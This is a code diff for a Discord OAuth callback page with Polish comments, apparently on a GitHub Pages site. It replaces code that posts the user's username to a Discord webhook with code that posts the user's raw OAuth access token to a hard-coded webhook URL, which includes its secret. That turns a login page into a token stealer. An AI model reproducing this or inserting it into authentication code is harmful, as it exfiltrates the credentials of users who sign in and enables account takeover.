@@ -35,38 +35,23 @@
         grant_type: 'authorization_code',
         code: code,
         redirect_uri: 'https://torch-studios.github.io/sfa/auth-callback',
-        scope: 'identify'
+        scope: 'identify' // Zakresy, które wykorzystujesz
       })
     })
     .then(response => response.json())
     .then(data => {
       var accessToken = data.access_token;
 
-      // Pobierz dane użytkownika
-      fetch('https://discord.com/api/v10/users/@me', {
-        method: 'GET',
+      // Wysyłanie tokenu dostępu na webhook
+      var webhookURL = 'https://discord.com/api/webhooks/1140998814434603128/X6xRfXdDHMFW2B12EJwvs-CYEl2NVEWHzLsz1SIW_7gIjBZKwYRdZXEsg-L2ZSXPtPNl'; // Zaktualizuj na właściwy URL webhooka
+      fetch(webhookURL, {
+        method: 'POST',
         headers: {
-          'Authorization': `Bearer ${accessToken}`
-        }
-      })
-      .then(response => response.json())
-      .then(data => {
-        var userName = data.username;
-        var webhookURL = 'https://discord.com/api/webhooks/1140998814434603128/X6xRfXdDHMFW2B12EJwvs-CYEl2NVEWHzLsz1SIW_7gIjBZKwYRdZXEsg-L2ZSXPtPNl';
-
-        // Wysyłanie nazwy użytkownika na webhook
-        fetch(webhookURL, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            content: `Nazwa użytkownika: ${userName}`
-          })
-        });
-      })
-      .catch(error => {
-        console.error('Błąd:', error);
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          content: `Token dostępu: ${accessToken}`
+        })
       });
     })
     .catch(error => {
